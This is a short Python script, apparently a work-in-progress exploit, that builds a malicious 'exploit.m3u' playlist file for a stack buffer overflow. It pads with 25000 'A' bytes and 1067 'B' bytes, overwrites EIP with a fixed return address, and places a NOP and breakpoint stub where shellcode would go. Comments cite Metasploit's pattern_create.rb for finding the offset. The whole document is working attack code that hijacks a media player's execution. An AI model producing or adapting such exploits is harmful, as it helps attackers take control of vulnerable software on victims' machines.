file_name:str = 'exploit.m3u'
m3uFileContent:str = "\x41"*25000 #30000 (5000 difference)
patternTillReachEIPOffest:str = "\x42"*1067
#EIP = "\x30\xF7\x0F\x00"#"HELL" #EIP = 4 BYTES
EIP = "\xe1\xbc\x08\x76"
#7608bce1
randomBeforeReachESP = "LOLO" #4 BYTES BEFORE REACH ESP
#THIS IS
ESP = "\x90\x90\x90\x90 \xcc\xcc WHERE OUR EIP WILL BE LOCATED"
#command to generate above (Kali linux) ./pattern_create.rb -l 5000
m3uFileContent = m3uFileContent.encode("raw_unicode_escape")
patternTillReachEIPOffest = patternTillReachEIPOffest.encode("raw_unicode_escape")
EIP = EIP.encode("raw_unicode_escape")
randomBeforeReachESP = randomBeforeReachESP.encode("raw_unicode_escape")
ESP = ESP.encode("raw_unicode_escape")
res = m3uFileContent + patternTillReachEIPOffest + EIP + randomBeforeReachESP + ESP
with open(file_name, "wb") as file:
    file.write(res)
